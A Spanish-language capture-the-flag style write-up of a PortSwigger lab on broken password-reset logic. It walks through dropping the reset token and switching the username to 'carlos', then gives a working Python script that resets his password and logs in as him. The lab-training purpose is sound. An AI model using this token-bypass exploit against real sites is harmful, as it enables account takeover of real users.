---
title: "03 Password reset broken logic"
collection: publications
category: portswigger
permalink: publications/Authentication/03_Password reset broken logic
excerpt: 'La funcionalidad de restablecimiento de contraseña de este laboratorio es vulnerable. Para resolver el laboratorio, restablecemos la contraseña de Carlos y luego iniciamos sesión y accedemos a su página «My account».'
date: 2024-12-04
#venue: 'Journal 1'
#slidesurl: 'http://academicpages.github.io/files/slides1.pdf'
#paperurl: 'http://academicpages.github.io/files/paper1.pdf'
citation: 'Password reset broken logic'
---

![logo]({{site.url}}/images/Authentication/authentication-lab-03/logo.png)

## Descripción del laboratorio

![Descripción]({{site.url}}/images/Authentication/authentication-lab-03/descripcion.png)

## Objetivo del laboratorio

Para resolver el laboratorio, restablecemos la contraseña de Carlos y luego iniciamos sesión y accedemos a su página «My account».

## Vector de ataque

En esta ocación el vector de ataque va a ser `Forgor password?` de reestablecer contraseña.

![Olvidar]({{site.url}}/images/Authentication/authentication-lab-03/olvidar.png)

Reestablecemos el passwor del usuario `wiener`

![Reestablecer]({{site.url}}/images/Authentication/authentication-lab-03/reestablecer.png)

Debemos mirar el correo.

![Correo]({{site.url}}/images/Authentication/authentication-lab-03/correo.png)

E ingresamos a la URL que nos dieron.

![Link]({{site.url}}/images/Authentication/authentication-lab-03/link.png)

Ingresamos una nueva contraseña.

![Nuevo]({{site.url}}/images/Authentication/authentication-lab-03/nevo.png)

## Vulnerar

Cuando ingresamos al link y muestra la pantalla de ingresar las contraseñas nuevas. Esa petición tiene unos token temporales.

![Token]({{site.url}}/images/Authentication/authentication-lab-03/token.png)

Que pasa si le eliminamos los Token's y le cambiamos el usuario a `carlos` ?. Vemos que nos hace una redirección. Eso es buena señal.

![Peticion]({{site.url}}/images/Authentication/authentication-lab-03/peticion.png)

## Login con las credenciales cambiadas

Probamos a ver si se realizo el cambio del password.

![Login]({{site.url}}/images/Authentication/authentication-lab-03/login.png)

## Aprobado

![Aprobado]({{site.url}}/images/Authentication/authentication-lab-03/aprobado.png)

# Codigo Python
```python
import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def access_carlos_account(s, url):

    # Reset Carlos's password
    print("(+) Resetting Carlos's password...")
    password_reset_url = url + "/forgot-password?temp-forgot-password-token=x"
    password_reset_data = {"temp-forgot-password-token": "x", "username": "carlos", "new-password-1": "password", "new-password-2": "password"}
    r = s.post(password_reset_url, data=password_reset_data, verify=False, proxies=proxies)

    # Access Carlos's account
    print("(+) Logging into Carlos's account...")
    login_url = url + "/login"
    login_data = {"username": "carlos", "password": "password"}
    r = s.post(login_url, data=login_data, verify=False, proxies=proxies)

    # Confirm exploit worked
    if "Log out" in r.text:
        print("(+) Successfully logged into Carlos's account.")
    else:
        print("(-) Exploit failed.")
        sys.exit(-1)

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    
    s = requests.Session()
    url = sys.argv[1]
    access_carlos_account(s, url)

if __name__ == "__main__":
    main()
```